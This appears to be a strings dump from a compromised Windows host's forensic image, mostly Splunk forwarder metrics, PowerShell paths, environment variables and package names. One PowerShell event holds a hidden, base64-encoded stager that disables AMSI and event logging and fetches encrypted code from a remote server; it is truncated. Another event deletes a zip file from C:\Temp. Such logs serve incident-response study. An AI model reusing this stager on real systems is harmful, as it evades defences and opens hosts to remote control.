+08-30-2024 16:17:34.328 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Finished processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx': total_events='0' with empty_msg='0'.
+HYPERV-UX-POWERSHELL-MODULE-HYPERV-WOW64-SERVERCOMMON-PACKAGE~31BF3856AD364E35~AMD64~~10.0.17763.1
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+08-30-2024 15:59:26.265 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:windows powershell", kbps=0.381, eps=0.115, kb=23.265, ev=7, avg_age=40.000, max_age=40, interval_sec=60
+C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+Windows PowerShell
+Windows PowerShell
+PowerShell
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command remove-item -path C:\Temp\1.zip
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+ows PowerShell.evtx
+ws PowerShell.evtx
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+HYPERV-UX-POWERSHELL-MODULE-HYPERV-WOW64-SERVERCOMMON-PACKAGE~31BF3856AD364E35~AMD64~~10.0.17763.1
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+powershell
+powershell2
+powershell2
+C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+%systemroot%\system32\windowspowershell\v1.0\powershell_ise.exe
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+A powershell command-line, script, or the full path to a script.
+A powershell command-line, script, or the full path to a script.
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+  <checkpoint_dir>C:\Program Files\SplunkUniversalForwarder\var\lib\splunk\modinputs\powershell2</checkpoint_dir>
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+Execute PowerShell scripts v2 with parameters as inputs.
+message from ""C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe""
+message from ""C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe" --ps2"
+script://C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe --ps2
+C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
+script://C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
+versalForwarder\bin\splunk-powershell.exe
+C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
+C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe --ps2
+C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
+C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe --ps2
+C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
+C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe --ps2
+C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe --ps2
+powershell
+powershell2
+powershell
+powershell2
+splunk-powershell.exe" --ps2
+powershell
+source::powershell2
+source::powershell
+sourcetype::powershell
+sourcetype::powershell2
+splunk-powershell.exe"
+C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+ource::C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+UTC:::PROVIDERDEFINITION.MICROSOFT-POWERSHELL-TELEMETRY
+WindowsPowerShell
+powershell_ise.exe
+Microsoft.PowerShell.DSC.Deployment-Group-admin-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+  <checkpoint_dir>C:\Program Files\SplunkUniversalForwarder\var\lib\splunk\modinputs\powershell</checkpoint_dir>
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+08-30-2024 16:14:41.378 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\microsoft-windows-powershell%4operational.evtx", kbps=0.036, eps=0.082, kb=2.188, ev=5, avg_age=42.400, max_age=43, interval_sec=60
+08-30-2024 16:14:41.378 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\windows powershell.evtx", kbps=0.090, eps=0.132, kb=5.493, ev=8, avg_age=40.000, max_age=40, interval_sec=60
+08-30-2024 16:14:41.378 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:microsoft-windows-powershell/operational", kbps=0.036, eps=0.082, kb=2.188, ev=5, avg_age=42.400, max_age=43, interval_sec=60
+08-30-2024 16:14:41.378 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:windows powershell", kbps=0.090, eps=0.132, kb=5.493, ev=8, avg_age=40.000, max_age=40, interval_sec=60
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+%SYSTEMROOT%_SYSWOW64_WINDOWSPOWERSHELL_V1.0_POWERSHELL.EXE
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+%systemroot%\system32\windowspowershell\v1.0\powershell_ise.exe
+%systemroot%\system32\windowspowershell\v1.0\powershell_ise.exe
+%SystemRoot%\syswow64\WindowsPowerShell\v1.0\powershell.exe
+powershell.exe
+powershell.exe
+powershell.exe
+powershell.exe
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+  <checkpoint_dir>C:\Program Files\SplunkUniversalForwarder\var\lib\splunk\modinputs\powershell2</checkpoint_dir>
+ServerComponent_PowerShellRoot
+PowerShellRoot
+ServerComponent_PowerShell
+PowerShell
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+08-30-2024 16:14:41.378 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\microsoft-windows-powershell%4operational.evtx", kbps=0.036, eps=0.082, kb=2.188, ev=5, avg_age=42.400, max_age=43, interval_sec=60
+08-30-2024 16:14:41.378 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\windows powershell.evtx", kbps=0.090, eps=0.132, kb=5.493, ev=8, avg_age=40.000, max_age=40, interval_sec=60
+08-30-2024 16:14:41.378 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:microsoft-windows-powershell/operational", kbps=0.036, eps=0.082, kb=2.188, ev=5, avg_age=42.400, max_age=43, interval_sec=60
+08-30-2024 16:14:41.378 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:windows powershell", kbps=0.090, eps=0.132, kb=5.493, ev=8, avg_age=40.000, max_age=40, interval_sec=60
+1source::C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx|host::Client2.BCS.local|WinEventLog:Microsoft-Windows-PowerShell/Operational|
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+ActiveDirectory-PowerShell
+Microsoft-ActiveDirectory-PowerShell-Package~31bf3856ad364e35~amd64~en-US~10.0.17763.1
+08-30-2024 16:03:30.332 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\windows powershell.evtx", kbps=0.633, eps=0.148, kb=38.573, ev=9, avg_age=11.000, max_age=11, interval_sec=60
+08-30-2024 16:03:30.332 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:windows powershell", kbps=0.633, eps=0.148, kb=38.573, ev=9, avg_age=11.000, max_age=11, interval_sec=60
+PowerShell
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+OW64\WindowsPowerShell\v1.0\powershell.e
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPower
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+%SYSTEMROOT%_SYSWOW64_WINDOWSPOWERSHELL_V1.0_POWERSHELL.EXE
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+Powershell v3 Modular Input
+Powershell v2 Modular Input
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+%SystemRoot%_System32_WindowsPowerShell_v1.0_powershell.exe
+%SystemRoot%_SysWOW64_WindowsPowerShell_v1.0_powershell.exe
+$SPLUNK_HOME\bin\splunk-powershell.exe --ps2
+08-30-2024 16:16:54.405 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx' updated less than 10000ms ago, will not read it until it stops changing. File size=1118208
+HYPERV-HOST-COMPUTE-POWERSHELL-MODULE-ONECORE-PACKAGE~31BF3856AD364E35~AMD64~EN-US~10.0.17763.1
+'PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Microsoft-Windows-PowerShell-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+POWERSHELLl
+%SYSTEMROOT%_SYSWOW64_WINDOWSPOWERSHELL_V1.0_POWERSHELL.EXE
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+	source::C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx||WinEventLog:Windows PowerShell|
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+1CE09B69A1E2B83B_01a_-_Windows_PowerShell_lnk_amd64.lnk
+%systemroot%\system32\windowspowershell\v1.0\powershell_ise.exe
+08-30-2024 16:14:41.378 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\microsoft-windows-powershell%4operational.evtx", kbps=0.036, eps=0.082, kb=2.188, ev=5, avg_age=42.400, max_age=43, interval_sec=60
+08-30-2024 16:14:41.378 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\windows powershell.evtx", kbps=0.090, eps=0.132, kb=5.493, ev=8, avg_age=40.000, max_age=40, interval_sec=60
+08-30-2024 16:14:41.378 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:microsoft-windows-powershell/operational", kbps=0.036, eps=0.082, kb=2.188, ev=5, avg_age=42.400, max_age=43, interval_sec=60
+08-30-2024 16:14:41.378 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:windows powershell", kbps=0.090, eps=0.132, kb=5.493, ev=8, avg_age=40.000, max_age=40, interval_sec=60
+Microsoft-Windows-PowerShell/Admin
+Microsoft-Windows-PowerShell/Analytic
+Microsoft-Windows-PowerShell/Debug
+Microsoft-Windows-PowerShell/Operational
+C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+ource::C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager/Analytic
+Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager/Debug
+Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager/Operational
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Microsoft-Windows-PowerShell-V2-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Microsoft-Windows-PowerShell-V2-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Microsoft-Windows-PowerShellWebAccess-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Microsoft-PowerShell-DSC-PullServer-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+usePowershell
+POWERSHELL_RASAPI32
+POWERSHELL_RASMANCS
+08-30-2024 16:06:33.424 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\windows powershell.evtx", kbps=1.265, eps=0.295, kb=77.146, ev=18, avg_age=13.000, max_age=15, interval_sec=60
+08-30-2024 16:06:33.424 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:windows powershell", kbps=1.265, eps=0.295, kb=77.146, ev=18, avg_age=13.000, max_age=15, interval_sec=60
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+08-30-2024 15:59:26.265 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:windows powershell", kbps=0.381, eps=0.115, kb=23.265, ev=7, avg_age=40.000, max_age=40, interval_sec=60
+POWERSHELLl
+%systemroot%\system32\windowspowershell\v1.0\powershell_ise.exe
+C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+Windows PowerShell
+Windows PowerShell
+PowerShell
+HYPERV-HOST-COMPUTE-POWERSHELL-MODULE-ONECORE-PACKAGE~31BF3856AD364E35~AMD64~EN-US~10.0.17763.1
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Microsoft-Windows-PowerShell-V2-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Microsoft-Windows-PowerShell-V2-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Microsoft-PowerShell-DSC-PullServer-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+08-30-2024 16:05:59.931 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx'
+08-30-2024 16:05:59.939 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Finished processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx': total_events='0' with empty_msg='0'.
+_path7C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+LogName=Windows PowerShell
+SourceName=PowerShell
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -w Hidden -enc SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB6AEEAQwA0AEEATQBRAEEAMABBAEQAQQBBAEwAZwBBAHoAQQBEAE0AQQBMAGcAQQB4AEEARABJAEEATQBBAEEANgBBAEQAawBBAE0AQQBBAHcAQQBEAE0AQQAnACkAKQApADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnACEAaAB6ACUAMgB4ADYAbQB0AEMAMABBAGUAWQBWACwANQBXAGoAdQA4ADQALwBbAHMAbgBMAGEAWABIAF8ARAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAcgByAHYAaABiAGEAeAA9AHoAegBFADIAYQBuAGMAaQBjAG8ARgBoAG8AdwBJAGUAcAB1AFAASABkAHoANQAvAE8AZwBrAD0AIgApADsAJABkAGEAdABhAD0AJAB3AGMALgBEAG8AdwBuA
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PowerShell
+PowerShellEngine
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+ServerComponent_PowerShellRoot
+PowerShellRoot
+ServerComponent_PowerShell
+PowerShell
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+HYPERV-UX-POWERSHELL-MODULE-HYPERV-WOW64-SERVERCOMMON-PACKAGE~31BF3856AD364E35~AMD64~~10.0.17763.1
+Microsoft-Windows-PowerShell-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|
+Microsoft-Windows-PowerShell-ISE-Package~31bf3856ad364e35~amd64~en-US~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package081120~31bf3856ad364e35~amd64~en-US~10.0.17763.1.cat|
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+Microsoft.PowerShell.DSC.Deployment-Group-admin-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat
+HYPERV-HOST-COMPUTE-POWERSHELL-MODULE-PACKAGE~31BF3856AD364E35~AMD64~EN-US~10.0.17763.1
+HYPERV-UX-POWERSHELL-MODULE-HYPERV-WOW64-VM-PACKAGE~31BF3856AD364E35~AMD64~~10.0.17763.1
+HYPERV-HOST-COMPUTE-POWERSHELL-MODULE-ONECORE-PACKAGE~31BF3856AD364E35~AMD64~~10.0.17763.1
